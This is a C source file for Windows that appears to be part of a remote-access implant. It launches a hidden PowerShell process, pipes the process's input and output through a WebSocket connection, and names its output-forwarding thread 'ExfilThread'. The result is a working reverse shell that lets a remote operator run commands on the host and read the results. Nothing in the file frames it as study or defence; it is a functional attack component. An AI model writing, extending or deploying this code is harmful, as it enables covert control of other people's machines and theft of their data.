#include "Shell.h"

void ReadFromShellThread(HANDLE data){
    LPReadShellOutPutThread info = (LPReadShellOutPutThread) data;
    HANDLE readPipe = info->StdoutPipe[0];
    HINTERNET ws = info->reqInfo->WebSocket;

    BYTE tmp[50];
    DWORD bytes_read;
    //printf("Thread Has Started\n");
    while(ReadFile(readPipe,tmp,50,&bytes_read,NULL)){
        //fwrite(tmp,bytes_read,1,stdout);
        if(WinHttpWebSocketSend(ws,WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,tmp,bytes_read) != NO_ERROR){
            printf("Failed To Send Data");
            return;
        }
    }

    //printf("Thread Has Finished\n");
}



int SpawnShell(LPReadShellOutPutThread info){
    
    
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;



    if(!CreatePipe(&info->StdoutPipe[0],&info->StdoutPipe[1],&saAttr,0)){
        return 0;
    }

    if(!CreatePipe(&info->StdInPipe[0],&info->StdInPipe[1],&saAttr,0)){
        return 0;
    }
    
    STARTUPINFOA st = {0};
    st.cb = sizeof(st);
    st.hStdError = st.hStdOutput = info->StdoutPipe[1];
    st.hStdInput = info->StdInPipe[0];
    st.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    st.wShowWindow = SW_HIDE;
    if(!CreateProcessA(NULL,"powershell.exe",NULL,NULL,TRUE,0,NULL,NULL,&st,&info->processInfo)){
        return 0;
    }
    
    HANDLE thread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ReadFromShellThread,info,0,NULL);
    if(!thread){
        return 0;
    }

    info->ExfilThread = thread;

    return 1;
}


void CleaupShell(LPReadShellOutPutThread info){

    if(info->ExfilThread){
        TerminateThread(info->ExfilThread,0);
        CloseHandle(info->ExfilThread);
    }
        
        

    if(info->processInfo.dwProcessId)
        TerminateProcess(info->processInfo.hProcess,0);
    if(info->processInfo.hThread)
        CloseHandle(info->processInfo.hThread);
    if(info->processInfo.hProcess)
        CloseHandle(info->processInfo.hProcess);
    if(info->StdInPipe[0])
        CloseHandle(info->StdInPipe[0]);
    if(info->StdoutPipe[0])    
        CloseHandle(info->StdoutPipe[0]);
    if(info->StdInPipe[1])
        CloseHandle(info->StdInPipe[1]);
    if(info->StdoutPipe[1])    
        CloseHandle(info->StdoutPipe[1]);

    memset(info,0,sizeof(ReadShellOutPutThread));
}


int WriteToShell(void * StdoinPipe, PDYNBUF_INFO cmd){
    DWORD lbytes;
    if(!WriteFile(StdoinPipe,cmd->data,cmd->length,&lbytes,NULL)){
        return 0;

    }
    return 1;
}
